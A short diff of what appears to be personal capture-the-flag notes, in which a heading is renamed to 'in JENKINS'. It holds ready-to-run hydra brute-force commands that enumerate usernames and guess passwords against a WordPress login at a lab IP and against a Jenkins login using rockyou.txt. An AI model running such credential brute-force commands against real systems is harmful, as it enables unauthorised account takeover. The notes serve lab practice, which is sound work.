@@ -8,6 +8,6 @@ hydra -L fsocity.dic -p test 10.10.66.104 http-post-form "/wp-login.php:log=^USE
 hydra -l Elliot -P fsocity.dic 10.10.66.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30 
 
 
-in ssh forwaring:
+in JENKINS
 hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
  
